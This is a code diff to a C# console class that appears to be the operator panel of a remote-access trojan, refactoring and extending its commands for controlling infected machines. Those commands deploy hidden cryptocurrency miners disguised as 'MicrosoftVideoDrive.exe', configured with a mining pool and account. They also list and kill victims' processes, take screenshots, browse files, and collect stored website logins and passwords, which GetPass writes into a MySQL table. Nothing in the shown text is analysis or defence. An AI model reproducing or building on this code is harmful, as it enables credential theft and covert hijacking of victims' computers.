@@ -9,11 +9,12 @@ namespace ServerWorker.ConsoleView
 {
     public class ConsoleViewUserCommands : IConsoleCommands
     {
-        public Action<IConsoleCommands> SwithCommander {get; set;} = delegate { };
-        private User Current;
+        public Action<IConsoleCommands> PushCommander {get; set;} = delegate { };
+        public Action PopCommander {get; set;} = delegate { };
+        private User _user;
         public ConsoleViewUserCommands(User user)
         {
-            Current = user;
+            _user = user;
 
             if (user.userData == null) 
             {
@@ -59,19 +60,19 @@ namespace ServerWorker.ConsoleView
             switch (valute.ToLower())
             {
                 case "none":
-                    Current.UsersCom.SetMSettings(@"Standart\Miner", "Data", "MicrosoftVideoDrive.exe","",false,DDMiners.none);
+                    _user.UsersCom.SetMSettings(@"Standart\Miner", "Data", "MicrosoftVideoDrive.exe","",false,DDMiners.none);
                     break;
                 case "xmr_cpu":
-                    Current.UsersCom.SetMSettings(@"M\XMRCPU", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_CPU);
+                    _user.UsersCom.SetMSettings(@"M\XMRCPU", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_CPU);
                     break;
                 case "xmr_n":
-                    Current.UsersCom.SetMSettings(@"M\XMRN", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_N);
+                    _user.UsersCom.SetMSettings(@"M\XMRN", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_N);
                     break;
                 case "xmr_a":
-                    Current.UsersCom.SetMSettings(@"M\XMRA", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_A);
+                    _user.UsersCom.SetMSettings(@"M\XMRA", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_A);
                     break;
                 case "eth_n":
-                    Current.UsersCom.SetMSettings(@"M\ETHN", "Data", "MicrosoftVideoDrive.exe", "-U -S eth.pool.minergate.com:45791 -u xismatulin.ru@yandex.ru --cuda-parallel-hash 4", true, DDMiners.ETH_N);
+                    _user.UsersCom.SetMSettings(@"M\ETHN", "Data", "MicrosoftVideoDrive.exe", "-U -S eth.pool.minergate.com:45791 -u xismatulin.ru@yandex.ru --cuda-parallel-hash 4", true, DDMiners.ETH_N);
                     break;
             }
         }
@@ -79,25 +80,25 @@ namespace ServerWorker.ConsoleView
         public void GetLog()
         {
             Console.WriteLine("Loading...");
-            var logs = Current.UsersCom.GetLog();
+            var logs = _user.UsersCom.GetLog();
             logs.ForEach(x => Console.WriteLine(x));
         }
 
         public void DeviceInfo()
         {
             Console.WriteLine("Loading...");
-            var infoDevice = Current.UsersCom.GetInfoDevice();
-            Current.userData.infoDevice = infoDevice;
+            var infoDevice = _user.UsersCom.GetInfoDevice();
+            _user.userData.infoDevice = infoDevice;
 
-            Current.userData.infoDevice.GetListInfo().ForEach(x => Console.WriteLine(x));
+            _user.userData.infoDevice.GetListInfo().ForEach(x => Console.WriteLine(x));
 
-              if (Current.userData.id != "")
-                    Current.userData.SaveDataToFile(Current.userData.id + ".xml");
+              if (_user.userData.id != "")
+                    _user.userData.SaveDataToFile(_user.userData.id + ".xml");
         }
 
         public void RunMiner()
         {
-            Current.UsersCom.RunM();
+            _user.UsersCom.RunM();
         }
 
         public void ScreenShoot()
@@ -108,59 +109,59 @@ namespace ServerWorker.ConsoleView
         public void GetProcesses()
         {
             Console.WriteLine("Loading...");
-            Current.UsersCom.GetListProc().ForEach(x => Console.WriteLine(x));
+            _user.UsersCom.GetListProc().ForEach(x => Console.WriteLine(x));
         }
 
         public void DirectoryViewer()
         {
-            throw new Exception("Метод еще не реализован");
+            PushCommander(new DirectoryViewCommands(_user));
         }
 
         public void KillProc(string processName)
         {
-            Current.UsersCom.KillProcess(processName);
+            _user.UsersCom.KillProcess(processName);
         }
 
         public void GetSettings()
         {
             Console.WriteLine("Loading...");
-            Current.userData.setting = Current.UsersCom.GetSetting();
+            _user.userData.setting = _user.UsersCom.GetSetting();
 
             Console.Write( "Comp_name===>> \t");
-            Console.WriteLine(Current.userData.setting.Comp_name);
+            Console.WriteLine(_user.userData.setting.Comp_name);
             Console.Write("IsMiner===>> \t");
-            Console.WriteLine(Current.userData.setting.IsMiner);
+            Console.WriteLine(_user.userData.setting.IsMiner);
             Console.Write("Key===>> \t");
-            Console.WriteLine(Current.userData.setting.Key);
+            Console.WriteLine(_user.userData.setting.Key);
             Console.Write("Open_sum===>> \t");
-            Console.WriteLine(Current.userData.setting.Open_sum);
+            Console.WriteLine(_user.userData.setting.Open_sum);
             Console.Write("Start_time===>> \t");
-            Console.WriteLine(Current.userData.setting.Start_time);
+            Console.WriteLine(_user.userData.setting.Start_time);
             Console.Write("Version===>> \t");
-            Console.WriteLine(Current.userData.setting.Version);
+            Console.WriteLine(_user.userData.setting.Version);
             Console.Write("MFTPFloader===>> \t");
-            Console.WriteLine(Current.userData.setting.MFTPFloader);
+            Console.WriteLine(_user.userData.setting.MFTPFloader);
             Console.Write("MLocalFloader===>> \t");
-            Console.WriteLine(Current.userData.setting.MLocalFloader);
+            Console.WriteLine(_user.userData.setting.MLocalFloader);
             Console.Write("MFileName===>> \t");
-            Console.WriteLine(Current.userData.setting.MFileName);
+            Console.WriteLine(_user.userData.setting.MFileName);
             Console.Write("MArgs===>> \t");
-            Console.WriteLine(Current.userData.setting.MArgs);
+            Console.WriteLine(_user.userData.setting.MArgs);
             Console.Write("MValut===>> \t");
-            Console.WriteLine(Current.userData.setting.MValut);
+            Console.WriteLine(_user.userData.setting.MValut);
 
-              if (Current.userData.id != "")
-                    Current.userData.SaveDataToFile(Current.userData.id + ".xml");
+              if (_user.userData.id != "")
+                    _user.userData.SaveDataToFile(_user.userData.id + ".xml");
         }
 
         public void OpenChat()
         {
-            throw new Exception("Метод еще не реализован");
+            _user.UsersCom.StartChat();
         }
 
         public void Back()
         {
-            SwithCommander.Invoke(new ConsoleViewCommands());
+            PopCommander();
         }
 
         public void GoToDownloadCommander()
@@ -170,9 +171,9 @@ namespace ServerWorker.ConsoleView
 
         public void GetPass()
         {        
-                var loginDataList = Current.UsersCom.SendLoginData("");
+                var loginDataList = _user.UsersCom.SendLoginData("");
 
-                MySQLData data = new MySQLData() { Table = Current.userData.id, Columns = new string[] { "Site", "Login", "Password"} };
+                MySQLData data = new MySQLData() { Table = _user.userData.id, Columns = new string[] { "Site", "Login", "Password"} };
                 foreach (LoginData loginData in loginDataList)
                 {
                     if (!string.IsNullOrWhiteSpace(loginData.WebSite) || !string.IsNullOrWhiteSpace(loginData.Login) || !string.IsNullOrWhiteSpace(loginData.Pass))
@@ -182,7 +183,7 @@ namespace ServerWorker.ConsoleView
                 var dataCount = data.Values.Count;
                 if (dataCount > 0)
                 {
-                    MySQLManager.CreateTable(Current.userData.id);
+                    MySQLManager.CreateTable(_user.userData.id);
                     MySQLManager.Send(data);
                 }
                 else 
@@ -194,9 +195,9 @@ namespace ServerWorker.ConsoleView
 
                 loginDataList.ForEach(x => Console.WriteLine(x.WebSite + " " + x.Login + " " + x.Pass));
                 
-                Current.userData.IsGettingLoginData = true;
-                if (Current.userData.id != "")
-                    Current.userData.SaveDataToFile(Current.userData.id + ".xml");
+                _user.userData.IsGettingLoginData = true;
+                if (_user.userData.id != "")
+                    _user.userData.SaveDataToFile(_user.userData.id + ".xml");
 
                 if (dataCount > 0) 
                 {
